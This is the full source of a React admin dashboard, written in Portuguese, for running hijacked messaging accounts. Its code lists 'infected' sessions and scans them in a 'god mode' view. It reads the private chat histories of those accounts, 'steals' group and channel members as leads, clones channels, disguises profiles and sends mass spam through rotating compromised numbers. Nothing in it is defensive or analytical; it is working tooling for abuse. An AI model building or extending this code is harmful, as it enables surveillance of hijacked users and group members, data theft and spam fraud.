import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [loginError, setLoginError] = useState('');

  const [tab, setTab] = useState('dashboard'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [processing, setProcessing] = useState(false);

  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  
  // --- ESTADOS DO ESPIÃO GLOBAL ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);

  // Estados de Chat e Mídia
  const [chatHistory, setChatHistory] = useState([]); 
  const [viewingChat, setViewingChat] = useState(null); 
  const [loadingHistory, setLoadingHistory] = useState(false);

  // Estados Tools
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // LOGIN
  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginError('');
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: passwordInput }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setIsAuthenticated(true);
      } else {
        setLoginError('Acesso Negado.');
      }
    } catch (error) { setLoginError('Erro de conexão.'); }
  };

  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  useEffect(() => {
      if(isAuthenticated) fetchData();
  }, [isAuthenticated]);

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const handleDelete = async (phone) => {
      if (!confirm(`Apagar ${phone}?`)) return;
      try {
          const res = await fetch('/api/delete-session', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ phone })
          });
          if (res.ok) {
              addLog(`🗑️ Conta ${phone} removida.`);
              setSessions(prev => prev.filter(s => s.phone_number !== phone));
          }
      } catch (e) { addLog(`❌ Erro ao deletar.`); }
  };

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     setProcessing(true);
     addLog('Iniciando...');
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
         const phones = Array.from(selectedPhones);
         for (let i = 0; i < leads.length; i++) {
             const sender = phones[i % phones.length];
             addLog(`[${i+1}/${leads.length}] ${sender} > ${leads[i].user_id}`);
             await fetch('/api/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ senderPhone: sender, target: leads[i].user_id, message: msg, leadDbId: leads[i].id })
             });
             await new Promise(r => setTimeout(r, 1500)); 
         }
         addLog('✅ Fim.'); fetchData();
     } catch (e) { addLog(`Erro: ${e.message}`); }
     setProcessing(false);
  };

  // --- FUNÇÃO GOD MODE: ESCANEAR TUDO ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta infectada para escanear.");
      setIsScanning(true);
      setAllGroups([]);
      setAllChannels([]);
      setScanProgress(0);

      let groups = [];
      let channels = [];

      addLog(`📡 Iniciando varredura em ${sessions.length} contas...`);

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          
          try {
              const res = await fetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              
              if (data.chats) {
                  data.chats.forEach(c => {
                      // Adiciona o dono da sessão ao objeto do chat
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') channels.push(chatObj);
                      else groups.push(chatObj);
                  });
              }
          } catch (e) {
              console.error(`Erro ao escanear ${phone}`);
          }
      }

      // Remove duplicatas (se duas contas estão no mesmo grupo)
      const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
      const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];

      // Ordena por tamanho
      setAllGroups(uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount));
      setAllChannels(uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount));
      
      setIsScanning(false);
      addLog(`✅ Varredura completa! ${uniqueGroups.length} Grupos, ${uniqueChannels.length} Canais encontrados.`);
  };

  const loadHistory = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
          const res = await fetch('/api/spy/get-history', { 
              method: 'POST', 
              body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), 
              headers: {'Content-Type': 'application/json'} 
          });
          const data = await res.json();
          setChatHistory(data.history || []);
      } catch (e) { addLog('Erro ao ler mensagens'); }
      setLoadingHistory(false);
  };

  const handleHarvest = async (chat) => {
      addLog(`🕷️ Roubando ${chat.title} (Via ${chat.ownerPhone})...`);
      const res = await fetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title,
              isChannel: chat.type === 'Canal' // Flag importante para o backend
          }), 
          headers: {'Content-Type': 'application/json'} 
      });
      const data = await res.json();
      
      if(data.success) {
          addLog(`✅ ${data.message}`);
          fetchData(); // Atualiza contadores
      } else {
          addLog(`❌ Erro: ${data.error}`);
      }
  };

  const handleCloneGroup = async (chat) => {
    addLog(`🐑 Clonando ${chat.title}...`);
    const res = await fetch('/api/spy/clone-group', { 
        method: 'POST', 
        body: JSON.stringify({ phone: chat.ownerPhone, originalChatId: chat.id, originalTitle: chat.title }), 
        headers: {'Content-Type': 'application/json'} 
    });
    if(res.ok) addLog('✅ Clonagem iniciada.'); else addLog('❌ Erro na clonagem.');
  };
  
  const handleUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`🎭 Atualizando ${phone}...`);
        await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
    }
    setProcessing(false); addLog('✅ Feito.');
};

const handlePostStory = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`📸 Story em ${phone}...`);
        await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
    }
    setProcessing(false); addLog('✅ Feito.');
};


  if (!isAuthenticated) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#0d1117', fontFamily: 'monospace' }}>
        <form onSubmit={handleLogin} style={{ background: '#161b22', padding: '40px', borderRadius: '10px', border: '1px solid #30363d', textAlign: 'center', width: '300px' }}>
            <h2 style={{ color: '#fff', marginTop: 0 }}>🔒 ACESSO RESTRITO</h2>
            <input type="password" placeholder="Senha" value={passwordInput} onChange={e => setPasswordInput(e.target.value)} style={{ width: '100%', padding: '10px', margin: '20px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', borderRadius: '5px' }} autoFocus />
            <button type="submit" style={{ width: '100%', padding: '10px', background: '#238636', color: '#fff', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>ENTRAR</button>
        </form>
      </div>
    );
  }

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
      
      {/* MODAL DE CHAT */}
      {viewingChat && (
          <div style={{position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999}}>
              <div style={{width: '90%', maxWidth: '600px', height: '85%', background: '#1c2128', borderRadius: '12px', display: 'flex', flexDirection: 'column', border: '1px solid #444c56', boxShadow: '0 0 50px rgba(0,0,0,0.5)'}}>
                  <div style={{padding: '15px', borderBottom: '1px solid #444c56', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#22272e', borderRadius: '12px 12px 0 0'}}>
                      <div>
                        <h3 style={{margin: 0, color: 'white'}}>{viewingChat.title}</h3>
                        <div style={{fontSize: '11px', color: '#8b949e'}}>Visualizando via: {viewingChat.ownerPhone}</div>
                      </div>
                      <button onClick={() => setViewingChat(null)} style={{background: 'transparent', border: 'none', color: '#ff5c5c', fontSize: '24px', cursor: 'pointer', padding: '0 10px'}}>✖</button>
                  </div>
                  <div style={{flex: 1, padding: '20px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '15px', background: '#0d1117'}}>
                      {loadingHistory ? <div style={{textAlign: 'center', color: '#3390ec', marginTop: '50px'}}>Carregando mensagens...</div> : (
                          chatHistory.length === 0 ? <p style={{textAlign: 'center', color: '#8b949e'}}>Histórico vazio ou restrito.</p> :
                          chatHistory.map(m => (
                              <div key={m.id} style={{
                                  alignSelf: m.isOut ? 'flex-end' : 'flex-start', 
                                  background: m.isOut ? '#1f6feb' : '#21262d', 
                                  padding: '10px 14px', 
                                  borderRadius: '12px', 
                                  maxWidth: '80%',
                                  borderBottomLeftRadius: m.isOut ? '12px' : '0',
                                  borderBottomRightRadius: m.isOut ? '0' : '12px',
                                  border: '1px solid rgba(255,255,255,0.05)'
                              }}>
                                  <div style={{fontSize: '11px', color: 'rgba(255,255,255,0.6)', marginBottom: '4px', fontWeight: 'bold'}}>{m.sender}</div>
                                  <div style={{color: 'white', lineHeight: '1.4'}}>{m.text}</div>
                                  {m.isMedia && <div style={{marginTop: '8px', padding: '4px 8px', background: 'rgba(0,0,0,0.2)', borderRadius: '4px', fontSize: '11px', display:'inline-block'}}>📷 Mídia Anexada</div>}
                              </div>
                          ))
                      )}
                  </div>
              </div>
          </div>
      )}

      {/* HEADER DE NAVEGAÇÃO */}
      <div style={{ marginBottom: '20px', borderBottom: '1px solid #30363d' }}>
        <button onClick={() => setTab('dashboard')} style={{ padding: '10px 20px', background: tab === 'dashboard' ? '#238636' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🚀 CRM</button>
        <button onClick={() => setTab('spy')} style={{ padding: '10px 20px', background: tab === 'spy' ? '#8957e5' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>👁️ VISÃO GERAL (GOD MODE)</button>
        <button onClick={() => setTab('tools')} style={{ padding: '10px 20px', background: tab === 'tools' ? '#1f6feb' : 'transparent', border: 'none', color: 'white', cursor: 'pointer' }}>🛠️ FERRAMENTAS</button>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '20px' }}>
        
        {/* ================= ABA DASHBOARD ================= */}
        {tab === 'dashboard' && (
           <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '20px' }}>
                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <div style={{ display: 'flex', gap: '10px', marginBottom: '20px' }}>
                        <div style={{ background: '#0d1117', padding: '10px', flex: 1, textAlign: 'center', border: '1px solid #30363d' }}>
                            <div style={{ fontSize: '18px', color: '#fff' }}>{stats.total}</div>
                            <div style={{ fontSize: '10px', color: '#8b949e' }}>LEADS CAPTURADOS</div>
                        </div>
                        <div style={{ background: '#0d1117', padding: '10px', flex: 1, textAlign: 'center', border: '1px solid #d29922' }}>
                            <div style={{ fontSize: '18px', color: '#d29922' }}>{stats.pending}</div>
                            <div style={{ fontSize: '10px', color: '#8b949e' }}>PENDENTES</div>
                        </div>
                        <div style={{ background: '#0d1117', padding: '10px', flex: 1, textAlign: 'center', border: '1px solid #238636' }}>
                            <div style={{ fontSize: '18px', color: '#238636' }}>{stats.sent}</div>
                            <div style={{ fontSize: '10px', color: '#8b949e' }}>ENVIADOS</div>
                        </div>
                    </div>
                    <h3>Disparo em Massa</h3>
                    <textarea value={msg} onChange={e => setMsg(e.target.value)} style={{ width: '100%', height: '80px', margin: '10px 0', background: '#0d1117', border: '1px solid #30363d', color: '#fff', padding: '10px' }} />
                    <button onClick={startRealCampaign} disabled={processing} style={{ width: '100%', padding: '15px', background: '#238636', color: 'white', border: 'none', fontWeight: 'bold' }}>{processing ? 'ENVIANDO...' : '▶️ DISPARAR PARA PENDENTES'}</button>
                    
                    <div style={{ marginTop: '20px', background: '#000', padding: '10px', height: '150px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '12px', color: '#00ff00' }}>
                        <div>root@server:~$ aguardando comando...</div>
                        {logs.map((l, i) => <div key={i}>{l}</div>)}
                    </div>
                </div>

                <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                    <h3>Contas ({sessions.length})</h3>
                    {sessions.map(s => (
                        <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px', borderBottom: '1px solid #30363d' }}>
                            <span style={{ fontSize: '13px' }}>{s.phone_number}</span>
                            <div>
                                <button onClick={() => toggleSelect(s.phone_number)} style={{ marginRight: '5px', background: selectedPhones.has(s.phone_number) ? '#238636' : '#21262d', border: '1px solid #30363d', color: 'white' }}>{selectedPhones.has(s.phone_number) ? '✓' : '+'}</button>
                                <button onClick={() => handleDelete(s.phone_number)} style={{ background: '#ff5c5c', border: 'none' }}>🗑️</button>
                            </div>
                        </div>
                    ))}
                </div>
           </div>
        )}

        {/* ================= ABA ESPIÃO (GOD MODE) ================= */}
        {tab === 'spy' && (
            <div style={{ backgroundColor: '#161b22', padding: '20px', borderRadius: '6px' }}>
                
                {/* BARRA DE CONTROLE */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', paddingBottom: '20px', borderBottom: '1px solid #30363d' }}>
                    <div>
                        <h2 style={{margin: 0, color: '#fff'}}>Radar Global 📡</h2>
                        <div style={{color: '#8b949e', fontSize: '12px'}}>
                            {allGroups.length + allChannels.length > 0 
                                ? `${allGroups.length} Grupos | ${allChannels.length} Canais encontrados.`
                                : "Clique em escanear para varrer todas as 40 contas."}
                        </div>
                    </div>
                    <button 
                        onClick={scanNetwork} 
                        disabled={isScanning}
                        style={{ padding: '12px 24px', background: isScanning ? '#21262d' : '#8957e5', color: 'white', border: 'none', borderRadius: '6px', fontWeight: 'bold', cursor: isScanning ? 'default' : 'pointer' }}
                    >
                        {isScanning ? `ESCANEANDO ${scanProgress}%...` : '🔄 ESCANEAR REDE'}
                    </button>
                </div>

                {/* COLUNAS */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
                    
                    {/* COLUNA ESQUERDA: GRUPOS (ALVOS DE ROUBO) */}
                    <div style={{ background: '#0d1117', padding: '15px', borderRadius: '8px', border: '1px solid #30363d' }}>
                        <h3 style={{color: '#d29922', borderBottom: '1px solid #30363d', paddingBottom: '10px', marginTop: 0}}>👥 GRUPOS (Roubar Leads)</h3>
                        <div style={{maxHeight: '600px', overflowY: 'auto'}}>
                            {allGroups.map(c => (
                                <div key={c.id} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '10px', borderBottom: '1px solid #21262d' }}>
                                    <div style={{width: '40px', height: '40px', borderRadius: '50%', background: '#21262d', overflow: 'hidden', flexShrink: 0}}>
                                        {c.photo ? <img src={c.photo} style={{width: '100%', height: '100%'}}/> : <div style={{height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center'}}>👥</div>}
                                    </div>
                                    <div style={{flex: 1, overflow: 'hidden'}}>
                                        <div style={{fontWeight: 'bold', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis'}}>{c.title}</div>
                                        <div style={{fontSize: '11px', color: '#8b949e'}}>{c.participantsCount?.toLocaleString()} Membros • Via {c.ownerPhone.slice(-4)}</div>
                                    </div>
                                    <button onClick={() => loadHistory(c)} style={{background: '#21262d', border: '1px solid #30363d', color: '#fff', padding: '5px', borderRadius: '4px', cursor: 'pointer'}}>💬</button>
                                    <button onClick={() => handleHarvest(c)} style={{background: '#d29922', border: 'none', color: '#fff', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold'}}>🕷️</button>
                                </div>
                            ))}
                            {allGroups.length === 0 && !isScanning && <div style={{textAlign: 'center', padding: '20px', color: '#8b949e'}}>Nenhum grupo listado.</div>}
                        </div>
                    </div>

                    {/* COLUNA DIREITA: CANAIS (CLONE + TENTATIVA DE ROUBO) */}
                    <div style={{ background: '#0d1117', padding: '15px', borderRadius: '8px', border: '1px solid #30363d' }}>
                        <h3 style={{color: '#3390ec', borderBottom: '1px solid #30363d', paddingBottom: '10px', marginTop: 0}}>📢 CANAIS (Clonar + Hack)</h3>
                        <div style={{maxHeight: '600px', overflowY: 'auto'}}>
                            {allChannels.map(c => (
                                <div key={c.id} style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '10px', borderBottom: '1px solid #21262d' }}>
                                    <div style={{width: '40px', height: '40px', borderRadius: '50%', background: '#21262d', overflow: 'hidden', flexShrink: 0}}>
                                        {c.photo ? <img src={c.photo} style={{width: '100%', height: '100%'}}/> : <div style={{height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center'}}>📢</div>}
                                    </div>
                                    <div style={{flex: 1, overflow: 'hidden'}}>
                                        <div style={{fontWeight: 'bold', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis'}}>{c.title}</div>
                                        <div style={{fontSize: '11px', color: '#8b949e'}}>{c.participantsCount?.toLocaleString()} Inscritos • Via {c.ownerPhone.slice(-4)}</div>
                                    </div>
                                    <button onClick={() => loadHistory(c)} style={{background: '#21262d', border: '1px solid #30363d', color: '#fff', padding: '5px', borderRadius: '4px', cursor: 'pointer'}}>💬</button>
                                    {/* Botão de Roubo em Canal agora é AZUL para indicar Tática Especial */}
                                    <button onClick={() => handleHarvest(c)} style={{background: '#1f6feb', border: 'none', color: '#fff', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold', fontSize: '10px'}}>🕷️ TENTAR</button>
                                    <button onClick={() => handleCloneGroup(c)} style={{background: '#238636', border: 'none', color: '#fff', padding: '5px 10px', borderRadius: '4px', cursor: 'pointer', fontWeight: 'bold'}}>🐑</button>
                                </div>
                            ))}
                            {allChannels.length === 0 && !isScanning && <div style={{textAlign: 'center', padding: '20px', color: '#8b949e'}}>Nenhum canal listado.</div>}
                        </div>
                    </div>
                </div>
            </div>
        )}

        {/* ================= ABA FERRAMENTAS ================= */}
        {tab === 'tools' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                    <h3>🎭 Camuflagem</h3>
                    <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                    <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                    <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR</button>
                </div>
            </div>
        )}
      </div>
    </div>
  );
}
